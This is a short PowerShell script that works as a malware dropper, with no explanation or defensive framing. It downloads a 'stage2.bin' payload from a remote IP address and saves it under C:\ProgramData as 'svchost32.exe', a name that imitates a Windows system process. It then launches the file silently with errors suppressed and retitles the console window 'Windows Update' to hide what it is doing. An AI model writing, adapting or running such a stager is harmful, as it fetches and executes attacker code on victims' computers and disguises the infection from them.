
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://203.0.113.196:443/stage2.bin',
    [string]$DownloadPath = "C:\ProgramData\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
